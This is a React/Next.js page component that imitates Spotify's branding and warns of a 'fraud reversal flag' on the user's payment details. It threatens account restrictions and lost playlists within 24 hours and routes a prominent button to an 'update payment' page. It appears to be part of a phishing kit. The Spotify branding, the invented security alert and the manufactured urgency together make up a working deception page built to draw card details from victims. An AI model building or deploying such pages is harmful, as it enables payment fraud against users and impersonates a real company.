"use client"

import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { AlertTriangle } from "lucide-react";
import Link from "next/link";
import { useRouter } from "next/navigation";

export default function SecurityWarningPage() {
  const router = useRouter();

  const handleUpdatePayment = () => {
    router.push("/account/update-payment");
  };

  return (
    <div className="flex items-center justify-center">
      <Card className="bg-[#181818] border-red-900 border-2 p-8 shadow-lg max-w-2xl w-full">
        <div className="flex flex-col items-center">
          <AlertTriangle className="h-16 w-16 text-red-500 mb-4" />

          <h1 className="text-3xl font-bold text-white mb-6">
            Spotify Account Issue
          </h1>

          <div className="space-y-4 text-left mb-8">
            <p className="text-white text-lg">
              We noticed a security issue regarding your Spotify account.
            </p>

            <p className="text-gray-300">
              We are having trouble with your current payment information due to a fraud reversal flag.
              To avoid membership termination, please update your payment information.
            </p>

            <div className="bg-[#282828] p-4 rounded-md border border-gray-700 text-gray-300 text-sm">
              <p className="font-medium text-white mb-1">Important Notice:</p>
              <p>
                Failure to update your payment information within the next 24 hours may result in
                account restrictions and potential loss of playlists, saved content, and premium features.
              </p>
            </div>
          </div>

          <Button
            onClick={handleUpdatePayment}
            className="w-full bg-[#1ed760] hover:bg-[#1fdf64] text-black font-semibold rounded-full py-6 text-lg"
          >
            Update Payment Information
          </Button>

          <p className="mt-4 text-gray-500 text-sm">
            Need help? <Link href="#" className="text-[#1ed760] hover:underline">Contact Spotify Support</Link>
          </p>
        </div>
      </Card>
    </div>
  );
}
